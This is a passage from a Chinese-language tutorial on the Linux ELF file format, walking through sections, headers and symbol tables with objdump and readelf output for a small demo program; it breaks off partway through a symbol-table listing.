BuildID[sha1]=ee88d1b2aa81f104ab5645d407e190b244203a52, for GNU/Linux 3.2.0, not stripped \u4e8e\u662f\u6211\u4eec\u5f97\u5230\u4e86 Linux \u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f ELF \uff08Executable Linkable Format\uff09\u6587\u4ef6\u7684\u4e09\u79cd\u7c7b\u578b\uff1a \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\uff08Relocatable file\uff09 \u5305\u542b\u4e86\u4ee3\u7801\u548c\u6570\u636e\uff0c\u53ef\u4ee5\u548c\u5176\u4ed6\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002 elfDemo.o \u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09 \u5305\u542b\u4e86\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u6587\u4ef6\u3002 elfDemo_static.out \u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08Shared Object File\uff09 \u5305\u542b\u4e86\u7528\u4e8e\u94fe\u63a5\u7684\u4ee3\u7801\u548c\u6570\u636e\uff0c\u5206\u4e24\u79cd\u60c5\u51b5\u3002\u4e00\u79cd\u662f\u94fe\u63a5\u5668\u5c06\u5176\u4e0e\u5176\u4ed6\u7684\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\uff0c\u751f\u4ea7\u65b0\u7684\u76ee\u6807\u6587\u4ef6\u3002\u53e6\u4e00\u79cd\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u591a\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7ed3\u5408\uff0c\u4f5c\u4e3a\u8fdb\u7a0b\u6620\u50cf\u7684\u4e00\u90e8\u5206\u3002 elfDemo.out libc-2.25.so \u6b64\u65f6\u4ed6\u4eec\u7684\u7ed3\u6784\u5982\u56fe\uff1a \u53ef\u4ee5\u770b\u5230\uff0c\u5728\u8fd9\u4e2a\u7b80\u5316\u7684 ELF \u6587\u4ef6\u4e2d\uff0c\u5f00\u5934\u662f\u4e00\u4e2a\u201c\u6587\u4ef6\u5934\u201d\uff0c\u4e4b\u540e\u5206\u522b\u662f\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u548c.bss\u6bb5\u3002\u7a0b\u5e8f\u6e90\u4ee3\u7801\u7f16\u8bd1\u540e\uff0c\u6267\u884c\u8bed\u53e5\u53d8\u6210\u673a\u5668\u6307\u4ee4\uff0c\u4fdd\u5b58\u5728 .text \u6bb5\uff1b\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728 .data \u6bb5\uff1b\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u5219\u653e\u5728 .bss \u6bb5\u3002 \u628a\u7a0b\u5e8f\u6307\u4ee4\u548c\u7a0b\u5e8f\u6570\u636e\u5206\u5f00\u5b58\u653e\u6709\u8bb8\u591a\u597d\u5904\uff0c\u4ece\u5b89\u5168\u7684\u89d2\u5ea6\u8bb2\uff0c\u5f53\u7a0b\u5e8f\u88ab\u52a0\u8f7d\u540e\uff0c\u6570\u636e\u548c\u6307\u4ee4\u5206\u522b\u88ab\u6620\u5c04\u5230\u4e24\u4e2a\u865a\u62df\u533a\u57df\u3002\u7531\u4e8e\u6570\u636e\u533a\u57df\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\u662f\u53ef\u8bfb\u5199\u7684\uff0c\u800c\u6307\u4ee4\u533a\u57df\u5bf9\u4e8e\u8fdb\u7a0b\u6765\u8bf4\u662f\u53ea\u8bfb\u7684\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a\u865a\u5b58\u533a\u57df\u7684\u6743\u9650\u53ef\u4ee5\u88ab\u5206\u522b\u8bbe\u7f6e\u6210\u53ef\u8bfb\u5199\u548c\u53ea\u8bfb\uff0c\u53ef\u4ee5\u9632\u6b62\u7a0b\u5e8f\u7684\u6307\u4ee4\u88ab\u6539\u5199\u548c\u5229\u7528\u3002 elfDemo.o \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u66f4\u6df1\u5165\u5730\u63a2\u7d22\u76ee\u6807\u6587\u4ef6\uff0c\u4f7f\u7528 objdump \u6765\u67e5\u770b\u76ee\u6807\u6587\u4ef6\u7684\u5185\u90e8\u7ed3\u6784: $ objdump -h elfDemo.o elfDemo.o: file format elf32-i386 Sections: Idx Name Size VMA LMA File off Algn 0 .group 00000008 00000000 00000000 00000034 2**2 CONTENTS, READONLY, GROUP, LINK_ONCE_DISCARD 1 .text 00000078 00000000 00000000 0000003c 2**0 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE 2 .data 00000008 00000000 00000000 000000b4 2**2 CONTENTS, ALLOC, LOAD, DATA 3 .bss 00000004 00000000 00000000 000000bc 2**2 ALLOC 4 .rodata 00000004 00000000 00000000 000000bc 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA 5 .text.__x86.get_pc_thunk.ax 00000004 00000000 00000000 000000c0 2**0 CONTENTS, ALLOC, LOAD, READONLY, CODE 6 .comment 00000012 00000000 00000000 000000c4 2**0 CONTENTS, READONLY 7 .note.GNU-stack 00000000 00000000 00000000 000000d6 2**0 CONTENTS, READONLY 8 .eh_frame 0000007c 00000000 00000000 000000d8 2**2 CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA \u53ef\u4ee5\u770b\u5230\u76ee\u6807\u6587\u4ef6\u4e2d\u9664\u4e86\u6700\u57fa\u672c\u7684\u4ee3\u7801\u6bb5\u3001\u6570\u636e\u6bb5\u548c BSS \u6bb5\u4ee5\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u522b\u7684\u6bb5\u3002\u6ce8\u610f\u5230 .bss \u6bb5\u6ca1\u6709 CONTENTS \u5c5e\u6027\uff0c\u8868\u793a\u5b83\u5b9e\u9645\u4e0a\u5e76\u4e0d\u5b58\u5728\uff0c.bss \u6bb5\u53ea\u662f\u4e3a\u4e3a\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u9884\u7559\u4e86\u4f4d\u7f6e\u800c\u5df2\u3002 \u4ee3\u7801\u6bb5 $ objdump -x -s -d elfDemo.o ...... Sections: Idx Name Size VMA LMA File off Algn ...... 1 .text 00000078 00000000 00000000 0000003c 2**0 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE ...... Contents of section .text: 0000 5589e553 83ec04e8 fcffffff 05010000 U..S............ 0010 0083ec08 ff75088d 90000000 005289c3 .....u.......R.. 0020 e8fcffff ff83c410 908b5dfc c9c38d4c ..........]....L 0030 240483e4 f0ff71fc 5589e551 83ec14e8 $.....q.U..Q.... 0040 fcffffff 05010000 00c745f4 1e000000 ..........E..... 0050 8b880000 00008b55 f401ca8b 80040000 .......U........ 0060 0001d083 ec0c50e8 fcffffff 83c41090 ......P......... 0070 8b4dfcc9 8d61fcc3 .M...a.. ...... Disassembly of section .text: 00000000 <func>: 0: 55 push %ebp 1: 89 e5 mov %esp,%ebp 3: 53 push %ebx 4: 83 ec 04 sub $0x4,%esp 7: e8 fc ff ff ff call 8 <func+0x8> 8: R_386_PC32 __x86.get_pc_thunk.ax c: 05 01 00 00 00 add $0x1,%eax d: R_386_GOTPC _GLOBAL_OFFSET_TABLE_ 11: 83 ec 08 sub $0x8,%esp 14: ff 75 08 pushl 0x8(%ebp) 17: 8d 90 00 00 00 00 lea 0x0(%eax),%edx 19: R_386_GOTOFF .rodata 1d: 52 push %edx 1e: 89 c3 mov %eax,%ebx 20: e8 fc ff ff ff call 21 <func+0x21> 21: R_386_PLT32 printf 25: 83 c4 10 add $0x10,%esp 28: 90 nop 29: 8b 5d fc mov -0x4(%ebp),%ebx 2c: c9 leave 2d: c3 ret 0000002e <main>: 2e: 8d 4c 24 04 lea 0x4(%esp),%ecx 32: 83 e4 f0 and $0xfffffff0,%esp 35: ff 71 fc pushl -0x4(%ecx) 38: 55 push %ebp 39: 89 e5 mov %esp,%ebp 3b: 51 push %ecx 3c: 83 ec 14 sub $0x14,%esp 3f: e8 fc ff ff ff call 40 <main+0x12> 40: R_386_PC32 __x86.get_pc_thunk.ax 44: 05 01 00 00 00 add $0x1,%eax 45: R_386_GOTPC _GLOBAL_OFFSET_TABLE_ 49: c7 45 f4 1e 00 00 00 movl $0x1e,-0xc(%ebp) 50: 8b 88 00 00 00 00 mov 0x0(%eax),%ecx 52: R_386_GOTOFF global_init_var 56: 8b 55 f4 mov -0xc(%ebp),%edx 59: 01 ca add %ecx,%edx 5b: 8b 80 04 00 00 00 mov 0x4(%eax),%eax 5d: R_386_GOTOFF .data 61: 01 d0 add %edx,%eax 63: 83 ec 0c sub $0xc,%esp 66: 50 push %eax 67: e8 fc ff ff ff call 68 <main+0x3a> 68: R_386_PC32 func 6c: 83 c4 10 add $0x10,%esp 6f: 90 nop 70: 8b 4d fc mov -0x4(%ebp),%ecx 73: c9 leave 74: 8d 61 fc lea -0x4(%ecx),%esp 77: c3 ret Contents of section .text \u662f .text \u7684\u6570\u636e\u7684\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\uff0c\u603b\u5171 0x78 \u4e2a\u5b57\u8282\uff0c\u6700\u5de6\u8fb9\u4e00\u5217\u662f\u504f\u79fb\u91cf\uff0c\u4e2d\u95f4 4 \u5217\u662f\u5185\u5bb9\uff0c\u6700\u53f3\u8fb9\u4e00\u5217\u662f ASCII \u7801\u5f62\u5f0f\u3002\u4e0b\u9762\u7684 Disassembly of section .text \u662f\u53cd\u6c47\u7f16\u7ed3\u679c\u3002 \u6570\u636e\u6bb5\u548c\u53ea\u8bfb\u6570\u636e\u6bb5 ...... Sections: Idx Name Size VMA LMA File off Algn 2 .data 00000008 00000000 00000000 000000b4 2**2 CONTENTS, ALLOC, LOAD, DATA 4 .rodata 00000004 00000000 00000000 000000bc 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA ...... Contents of section .data: 0000 0a000000 14000000 ........ Contents of section .rodata: 0000 25640a00 %d.. ....... .data \u6bb5\u4fdd\u5b58\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u3002 elfDemo.c \u4e2d\u5171\u6709\u4e24\u4e2a\u8fd9\u6837\u7684\u53d8\u91cf\uff0c global_init_var \u548c local_static_init_var \uff0c\u6bcf\u4e2a\u53d8\u91cf 4 \u4e2a\u5b57\u8282\uff0c\u4e00\u5171 8 \u4e2a\u5b57\u8282\u3002\u7531\u4e8e\u5c0f\u7aef\u5e8f\u7684\u539f\u56e0\uff0c 0a000000 \u8868\u793a global_init_var \u503c\uff08 10 \uff09\u7684\u5341\u516d\u8fdb\u5236 0x0a \uff0c 14000000 \u8868\u793a local_static_init_var \u503c\uff08 20 \uff09\u7684\u5341\u516d\u8fdb\u5236 0x14 \u3002 .rodata \u6bb5\u4fdd\u5b58\u53ea\u8bfb\u6570\u636e\uff0c\u5305\u62ec\u53ea\u8bfb\u53d8\u91cf\u548c\u5b57\u7b26\u4e32\u5e38\u91cf\u3002 elfDemo.c \u4e2d\u8c03\u7528 printf \u7684\u65f6\u5019\uff0c\u7528\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u53d8\u91cf %d\\n \uff0c\u5b83\u662f\u4e00\u79cd\u53ea\u8bfb\u6570\u636e\uff0c\u4fdd\u5b58\u5728 .rodata \u6bb5\u4e2d\uff0c\u53ef\u4ee5\u4ece\u8f93\u51fa\u7ed3\u679c\u770b\u5230\u5b57\u7b26\u4e32\u5e38\u91cf\u7684 ASCII \u5f62\u5f0f\uff0c\u4ee5 \\0 \u7ed3\u5c3e\u3002 BSS\u6bb5 Sections: Idx Name Size VMA LMA File off Algn 3 .bss 00000004 00000000 00000000 000000bc 2**2 ALLOC .bss \u6bb5\u4fdd\u5b58\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u9759\u6001\u53d8\u91cf\u3002 ELF \u6587\u4ef6\u7ed3\u6784 \u5bf9\u8c61\u6587\u4ef6\u53c2\u4e0e\u7a0b\u5e8f\u94fe\u63a5\uff08\u6784\u5efa\u7a0b\u5e8f\uff09\u548c\u7a0b\u5e8f\u6267\u884c\uff08\u8fd0\u884c\u7a0b\u5e8f\uff09\u3002ELF \u7ed3\u6784\u51e0\u76f8\u5173\u4fe1\u606f\u5728 /usr/include/elf.h \u3000\u6587\u4ef6\u4e2d\u3002 ELF \u6587\u4ef6\u5934\uff08ELF Header\uff09 \u5728\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u7684\u6700\u524d\u9762\uff0c\u5305\u542b\u4e86\u63cf\u8ff0\u6574\u4e2a\u6587\u4ef6\u7684\u57fa\u672c\u5c5e\u6027\u3002 \u7a0b\u5e8f\u5934\u8868\uff08Program Header Table\uff09 \u662f\u53ef\u9009\u7684\uff0c\u5b83\u544a\u8bc9\u7cfb\u7edf\u600e\u6837\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\u6620\u50cf\u3002\u53ef\u6267\u884c\u6587\u4ef6\u5fc5\u987b\u6709\u7a0b\u5e8f\u5934\u8868\uff0c\u800c\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e0d\u9700\u8981\u3002 \u6bb5\uff08Section\uff09 \u5305\u542b\u4e86\u94fe\u63a5\u89c6\u56fe\u4e2d\u5927\u91cf\u7684\u76ee\u6807\u6587\u4ef6\u4fe1\u606f\u3002 \u6bb5\u8868\uff08Section Header Table\uff09 \u5305\u542b\u4e86\u63cf\u8ff0\u6587\u4ef6\u4e2d\u6240\u6709\u6bb5\u7684\u4fe1\u606f\u3002 32\u4f4d\u6570\u636e\u7c7b\u578b \u540d\u79f0 \u957f\u5ea6 \u5bf9\u5176 \u63cf\u8ff0 \u539f\u59cb\u7c7b\u578b Elf32_Addr 4 4 \u65e0\u7b26\u53f7\u7a0b\u5e8f\u5730\u5740 uint32_t Elf32_Half 2 2 \u65e0\u7b26\u53f7\u77ed\u6574\u578b uint16_t Elf32_Off 4 4 \u65e0\u7b26\u53f7\u504f\u79fb\u5730\u5740 uint32_t Elf32_Sword 4 4 \u6709\u7b26\u53f7\u6574\u578b int32_t Elf32_Word 4 4 \u65e0\u7b26\u53f7\u6574\u578b uint32_t \u6587\u4ef6\u5934 ELF \u6587\u4ef6\u5934\u5fc5\u7136\u5b58\u5728\u4e8e ELF \u6587\u4ef6\u7684\u5f00\u5934\uff0c\u8868\u660e\u8fd9\u662f\u4e00\u4e2a ELF \u6587\u4ef6\u3002\u5b9a\u4e49\u5982\u4e0b\uff1a typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */ } Elf32_Ehdr; typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf64_Half e_type; /* Object file type */ Elf64_Half e_machine; /* Architecture */ Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; /* Processor-specific flags */ Elf64_Half e_ehsize; /* ELF header size in bytes */ Elf64_Half e_phentsize; /* Program header table entry size */ Elf64_Half e_phnum; /* Program header table entry count */ Elf64_Half e_shentsize; /* Section header table entry size */ Elf64_Half e_shnum; /* Section header table entry count */ Elf64_Half e_shstrndx; /* Section header string table index */ } Elf64_Ehdr; e_ident \u4fdd\u5b58\u7740 ELF \u7684\u5e7b\u6570\u548c\u5176\u4ed6\u4fe1\u606f\uff0c\u6700\u524d\u9762\u56db\u4e2a\u5b57\u8282\u662f\u5e7b\u6570\uff0c\u7528\u5b57\u7b26\u4e32\u8868\u793a\u4e3a \\177ELF \uff0c\u5176\u540e\u7684\u5b57\u8282\u5982\u679c\u662f 32 \u4f4d\u5219\u662f ELFCLASS32 (1)\uff0c\u5982\u679c\u662f 64 \u4f4d\u5219\u662f ELFCLASS64 (2)\uff0c\u518d\u5176\u540e\u7684\u5b57\u8282\u8868\u793a\u7aef\u5e8f\uff0c\u5c0f\u7aef\u5e8f\u4e3a ELFDATA2LSB (1)\uff0c\u5927\u7aef\u5e8f\u4e3a ELFDATA2LSB (2)\u3002\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5219\u8868\u793a ELF \u7684\u7248\u672c\u3002 \u73b0\u5728\u6211\u4eec\u4f7f\u7528 readelf \u547d\u4ee4\u6765\u67e5\u770b elfDome.out \u7684\u6587\u4ef6\u5934\uff1a $ readelf -h elfDemo.out ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x3e0 Start of program headers: 52 (bytes into file) Start of section headers: 6288 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 9 Size of section headers: 40 (bytes) Number of section headers: 30 Section header string table index: 29 \u7a0b\u5e8f\u5934 \u7a0b\u5e8f\u5934\u8868\u662f\u7531 ELF \u5934\u7684 e_phoff \u6307\u5b9a\u7684\u504f\u79fb\u91cf\u548c e_phentsize \u3001 e_phnum \u5171\u540c\u786e\u5b9a\u5927\u5c0f\u7684\u8868\u683c\u7ec4\u6210\u3002 e_phentsize \u8868\u793a\u8868\u683c\u4e2d\u7a0b\u5e8f\u5934\u7684\u5927\u5c0f\uff0c e_phnum \u8868\u793a\u8868\u683c\u4e2d\u7a0b\u5e8f\u5934\u7684\u6570\u91cf\u3002 \u7a0b\u5e8f\u5934\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a typedef struct { Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment */ } Elf32_Phdr; typedef struct { Elf64_Word p_type; /* Segment type */ Elf64_Word p_flags; /* Segment flags */ Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment */ } Elf64_Phdr; \u4f7f\u7528 readelf \u6765\u67e5\u770b\u7a0b\u5e8f\u5934\uff1a $ readelf -l elfDemo.out Elf file type is DYN (Shared object file) Entry point 0x3e0 There are 9 program headers, starting at offset 52 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x00000034 0x00000034 0x00120 0x00120 R E 0x4 INTERP 0x000154 0x00000154 0x00000154 0x00013 0x00013 R 0x1 [Requesting program interpreter: /lib/ld-linux.so.2] LOAD 0x000000 0x00000000 0x00000000 0x00780 0x00780 R E 0x1000 LOAD 0x000ef4 0x00001ef4 0x00001ef4 0x00130 0x0013c RW 0x1000 DYNAMIC 0x000efc 0x00001efc 0x00001efc 0x000f0 0x000f0 RW 0x4 NOTE 0x000168 0x00000168 0x00000168 0x00044 0x00044 R 0x4 GNU_EH_FRAME 0x000624 0x00000624 0x00000624 0x00044 0x00044 R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 GNU_RELRO 0x000ef4 0x00001ef4 0x00001ef4 0x0010c 0x0010c R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 03 .init_array .fini_array .dynamic .got .got.plt .data .bss 04 .dynamic 05 .note.ABI-tag .note.gnu.build-id 06 .eh_frame_hdr 07 08 .init_array .fini_array .dynamic .got \u6bb5 \u6bb5\u8868\uff08Section Header Table\uff09\u662f\u4e00\u4e2a\u4ee5 Elf32_Shdr \u3000\u7ed3\u6784\u4f53\u4e3a\u5143\u7d20\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u7ed3\u6784\u4f53\u5bf9\u5e94\u4e00\u4e2a\u6bb5\uff0c\u5b83\u63cf\u8ff0\u4e86\u5404\u4e2a\u6bb5\u7684\u4fe1\u606f\u3002ELF \u6587\u4ef6\u5934\u7684 e_shoff \u3000\u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u8868\u5728 ELF \u4e2d\u7684\u504f\u79fb\uff0c e_shnum \u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u63cf\u8ff0\u7b26\u7684\u6570\u91cf\uff0c e_shentsize \u7ed9\u51fa\u4e86\u6bcf\u4e2a\u6bb5\u63cf\u8ff0\u7b26\u7684\u5927\u5c0f\u3002 typedef struct { Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */ } Elf32_Shdr; typedef struct { Elf64_Word sh_name; /* Section name (string tbl index) */ Elf64_Word sh_type; /* Section type */ Elf64_Xword sh_flags; /* Section flags */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Section size in bytes */ Elf64_Word sh_link; /* Link to another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */ } Elf64_Shdr; \u4f7f\u7528 readelf \u547d\u4ee4\u67e5\u770b\u76ee\u6807\u6587\u4ef6\u4e2d\u5b8c\u6574\u7684\u6bb5\uff1a $ readelf -S elfDemo.o There are 15 section headers, starting at offset 0x41c: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .group GROUP 00000000 000034 000008 04 12 16 4 [ 2] .text PROGBITS 00000000 00003c 000078 00 AX 0 0 1 [ 3] .rel.text REL 00000000 000338 000048 08 I 12 2 4 [ 4] .data PROGBITS 00000000 0000b4 000008 00 WA 0 0 4 [ 5] .bss NOBITS 00000000 0000bc 000004 00 WA 0 0 4 [ 6] .rodata PROGBITS 00000000 0000bc 000004 00 A 0 0 1 [ 7] .text.__x86.get_p PROGBITS 00000000 0000c0 000004 00 AXG 0 0 1 [ 8] .comment PROGBITS 00000000 0000c4 000012 01 MS 0 0 1 [ 9] .note.GNU-stack PROGBITS 00000000 0000d6 000000 00 0 0 1 [10] .eh_frame PROGBITS 00000000 0000d8 00007c 00 A 0 0 4 [11] .rel.eh_frame REL 00000000 000380 000018 08 I 12 10 4 [12] .symtab SYMTAB 00000000 000154 000140 10 13 13 4 [13] .strtab STRTAB 00000000 000294 0000a2 00 0 0 1 [14] .shstrtab STRTAB 00000000 000398 000082 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), p (processor specific) \u6ce8\u610f\uff0cELF \u6bb5\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u88ab\u4fdd\u7559\u7684\uff0c\u7c7b\u578b\u4e3a NULL\u3002 \u5b57\u7b26\u4e32\u8868 \u5b57\u7b26\u4e32\u8868\u4ee5\u6bb5\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u5305\u542b\u4e86\u4ee5 null\u3000\u7ed3\u5c3e\u7684\u5b57\u7b26\u5e8f\u5217\u3002\u5bf9\u8c61\u6587\u4ef6\u4f7f\u7528\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6765\u8868\u793a\u7b26\u53f7\u548c\u6bb5\u540d\u79f0\uff0c\u5f15\u7528\u5b57\u7b26\u4e32\u65f6\u53ea\u9700\u7ed9\u51fa\u5728\u8868\u4e2d\u7684\u504f\u79fb\u5373\u53ef\u3002\u5b57\u7b26\u4e32\u8868\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u548c\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u4e3a\u7a7a\u5b57\u7b26\uff0c\u4ee5\u786e\u4fdd\u6240\u6709\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u548c\u7ec8\u6b62\u3002\u901a\u5e38\u6bb5\u540d\u4e3a .strtab \u7684\u5b57\u7b26\u4e32\u8868\u662f \u5b57\u7b26\u4e32\u8868\uff08Strings Table\uff09 \uff0c\u6bb5\u540d\u4e3a .shstrtab \u7684\u662f\u6bb5\u8868\u5b57\u7b26\u4e32\u8868\uff08Section Header String Table\uff09\u3002 \u504f\u79fb +0 +1 +2 +3 +4 +5 +6 +7 +8 +9 +0 \\0 h e l l o \\0 w o r +10 l d \\0 h e l l o w o +20 r l d \\0 \u504f\u79fb \u5b57\u7b26\u4e32 0 \u7a7a\u5b57\u7b26\u4e32 1 hello 7 world 13 helloworld 18 world \u53ef\u4ee5\u4f7f\u7528 readelf \u8bfb\u53d6\u8fd9\u4e24\u4e2a\u8868\uff1a $ readelf -x .strtab elfDemo.o Hex dump of section '.strtab': 0x00000000 00656c66 44656d6f 2e63006c 6f63616c .elfDemo.c.local 0x00000010 5f737461 7469635f 696e6974 5f766172 _static_init_var 0x00000020 2e323139 35006c6f 63616c5f 73746174 .2195.local_stat 0x00000030 69635f75 6e696e69 745f7661 722e3231 ic_uninit_var.21 0x00000040 39360067 6c6f6261 6c5f696e 69745f76 96.global_init_v 0x00000050 61720067 6c6f6261 6c5f756e 696e6974 ar.global_uninit 0x00000060 5f766172 0066756e 63005f5f 7838362e _var.func.__x86. 0x00000070 6765745f 70635f74 68756e6b 2e617800 get_pc_thunk.ax. 0x00000080 5f474c4f 42414c5f 4f464653 45545f54 _GLOBAL_OFFSET_T 0x00000090 41424c45 5f007072 696e7466 006d6169 ABLE_.printf.mai 0x000000a0 6e00 $ readelf -x .shstrtab elfDemo.o Hex dump of section '.shstrtab': 0x00000000 002e7379 6d746162 002e7374 72746162 ..symtab..strtab 0x00000010 002e7368 73747274 6162002e 72656c2e ..shstrtab..rel. 0x00000020 74657874 002e6461 7461002e 62737300 text..data..bss. 0x00000030 2e726f64 61746100 2e746578 742e5f5f .rodata..text.__ 0x00000040 7838362e 6765745f 70635f74 68756e6b x86.get_pc_thunk 0x00000050 2e617800 2e636f6d 6d656e74 002e6e6f .ax..comment..no 0x00000060 74652e47 4e552d73 7461636b 002e7265 te.GNU-stack..re 0x00000070 6c2e6568 5f667261 6d65002e 67726f75 l.eh_frame..grou 0x00000080 7000 \u7b26\u53f7\u8868 \u76ee\u6807\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u4fdd\u5b58\u4e86\u5b9a\u4f4d\u548c\u91cd\u5b9a\u4f4d\u7a0b\u5e8f\u7684\u7b26\u53f7\u5b9a\u4e49\u548c\u5f15\u7528\u6240\u9700\u7684\u4fe1\u606f\u3002\u7b26\u53f7\u8868\u7d22\u5f15\u662f\u8fd9\u4e2a\u6570\u7ec4\u7684\u4e0b\u6807\u3002\u7d22\u5f15\uff10\u6307\u5411\u8868\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6761\u76ee\uff0c\u4f5c\u4e3a\u672a\u5b9a\u4e49\u7684\u7b26\u53f7\u7d22\u5f15\u3002 typedef struct { Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf32_Section st_shndx; /* Section index */ } Elf32_Sym; typedef struct { Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */ } Elf64_Sym; \u67e5\u770b\u7b26\u53f7\u8868\uff1a $ readelf -s elfDemo.o Symbol table '.symtab' contains 20 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FILE 